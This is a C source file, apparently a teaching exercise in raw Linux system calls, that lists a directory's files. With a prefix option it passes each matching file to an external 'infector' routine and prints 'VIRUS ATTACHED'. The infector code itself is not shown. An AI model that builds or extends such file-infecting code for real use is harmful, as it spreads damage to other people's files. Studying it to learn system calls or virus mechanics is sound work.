#include "util.h"

#define SYS_EXIT 1
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_GETDENTS 141

#define O_RDONLY 0

extern void infector(char *filename);

/* Linux kernel dirent structure for 32-bit systems */
struct directory
{
    unsigned long id;     /* Id number */
    unsigned long offset; /* Offset to next dirct in the disk */
    unsigned short length;
    char d_name[]; /* Filename (null-terminated) */
};

int main(int argc, char *argv[])
{
    int i;
    char prefix = 0;
    int has_prefix = 0; /*indicator*/
    int fd;
    int numread;
    int bfpos = 0;
    char buf[8192]; /* buffer for getdents*/

    /* loop the arguments to find any prefix if it exists!!*/
    for (i = 1; i < argc; i++)
    {
        if (argv[i][0] == '-' && argv[i][1] == 'a')
        {
            prefix = argv[i][2]; /* Get the 1-character prefix after "-a"*/
            has_prefix = 1;
        }
    }

    /* open current directory
     sys: what to do, where, how- flags, extra
     sys_open: eax=5, ebx=filename, ecx=flags, edx=mode*/
    fd = system_call(SYS_OPEN, ".", O_RDONLY, 0); /* for reading only*/
    if (fd < 0)
    { /* error*/
        system_call(SYS_EXIT, 0x55);
    }
    /* now read the files*/
    numread = system_call(SYS_GETDENTS, fd, buf, 8192);
    if (numread <= 0)
    {
        system_call(SYS_EXIT, 0x55); /* Terminate with 0x55 on error */
    }
    while (bfpos < numread)
    {
        struct directory *d = (struct directory *)(buf + bfpos);
        char *filename = d->d_name;

        if (!has_prefix || filename[0] == prefix)
        {
            /* print the filename using system call
             sys_write: eax=4, ebx=file, ecx=buffer, edx=count*/
            system_call(SYS_WRITE, 1, filename, strlen(filename));

            if (has_prefix)
            {
                infector(filename);
                system_call(SYS_WRITE, 1, " VIRUS ATTACHED", 15);
            }

            system_call(SYS_WRITE, 1, "\n", 1);
        }

        bfpos += d->length;
    }

    /* close the file*/
    system_call(SYS_CLOSE, fd);
    return 0;
}